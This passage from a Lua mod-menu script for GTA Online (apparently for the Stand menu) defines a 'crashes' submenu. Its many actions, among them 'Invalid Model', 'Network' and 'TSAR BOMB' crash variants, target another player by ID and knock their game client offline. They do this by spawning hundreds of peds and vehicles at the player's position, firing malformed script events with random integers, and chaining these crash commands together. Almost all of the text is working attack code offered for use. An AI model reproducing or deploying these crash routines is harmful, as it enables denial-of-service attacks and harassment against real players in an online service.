            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)

    menu.action(crashes, "5G崩溃", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    menu.action(crashes, "AIO崩溃", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
            end
            util.yield_once()
        end
    end)

    menu.action(crashes, "大春逗崩溃", {"crashv27"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        local animation_tonta = ("anim@mp_player_intupperstinker")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos, 0)
            local ped_ = entities.create_ped(1, mdl2, pos, 0)
            local ped3 = entities.create_ped(1, mdl3, pos, 0)
            local ped3 = entities.create_ped(1, mdl4, pos, 0)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
            util.yield(100)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)

            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            util.yield(200)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)	
	
    menu.action(crashes, "Powerfull崩溃", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local my_pos = ENTITY.GET_ENTITY_COORDS(user)
        local anim_dict = ("anim@mp_player_intupperstinker")
        anim_request(anim_dict)
        BlockSyncs(pid, function()
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            util.yield(100)
            TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "toma", "puto", "tonto", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
            util.yield(100)
        end)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, my_pos.x, my_pos.y, my_pos.z, false, false, false)
    
    end)


    menu.action(crashes, "Invaild Model 崩溃V1", {"crashv4"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(crashes, "Invaild Model 崩溃V2", {"crashv5"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)

    end)

    menu.action(crashes, "Invaild Model 崩溃V3", {"crashv10"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(crashes, "Invaild Model 崩溃V4", {"crashv12"}, "", function(on_toggle)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            for i = 0, 100 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            return
        end
    end)
	
	    menu.action(crashes, "Invalid Model 崩溃V5", {"crashv18"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local pos = players.get_position(player_id)
                local mdl = util.joaat("u_m_m_jesus_01")
                local veh_mdl = util.joaat("oppressor")
                util.request_model(veh_mdl)
        util.request_model(mdl)
                        for i = 1, 10 do
                                if not players.exists(player_id) then
                                        return
                                end
                                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                                local jesus = entities.create_ped(2, mdl, pos, 0)
                                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                                util.yield(100)
                                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                                util.yield(1000)
                                entities.delete_by_handle(jesus)
                                entities.delete_by_handle(veh)
                        end
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    menu.action(crashes, "Invalid Model 崩溃V6", {"crashv19"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    menu.action(crashes, "Invalid Model 崩溃V7", {"crashv26"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)

    local pclpid = {}

    menu.action(crashes, "Invalid Model 崩溃V8", {"crashv28"}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 25 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
	
	
    menu.action(crashes, "Network 崩溃V1", {"crashv13"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)
    menu.action(crashes, "Network  崩溃V2", {"crashv14"}, "", function(on_loop)
        local cord = players.get_position(player_id)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("崩溃完成")
    end)



	
	

    

    local c
    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local kitteh_hash = util.joaat("a_c_cat_01")
    ryze.request_model_load(kitteh_hash)

    local crash_tbl = {
        "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
        "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
        "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
    }

    local crash_tbl_2 = {
        {17, 32, 48, 69},
        {14, 30, 37, 46, 47, 63},
        {9, 27, 28, 60}
    }
    menu.action(crashes, "TSAR BOMB崩溃V1", {"tsarbomba"}, "", function()
        local objective = player_id
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(500)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(500)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(500)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        util.yield(500)
        menu.trigger_commands("crashv8"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv9"..players.get_name(player_id))
        util.yield(2000)
        util.yield(1800)
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)

    if menu.get_edition() >= 2 then 
        menu.action(crashes, "TSAR BOMB 崩溃V2", {"tsarbomba"}, "", function()
            local objective = player_id
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("trafficpotato on")
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            util.yield(2500)
            menu.trigger_commands("crashv1"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv2"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("crashv4"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv5"..players.get_name(player_id))
            util.yield(500)
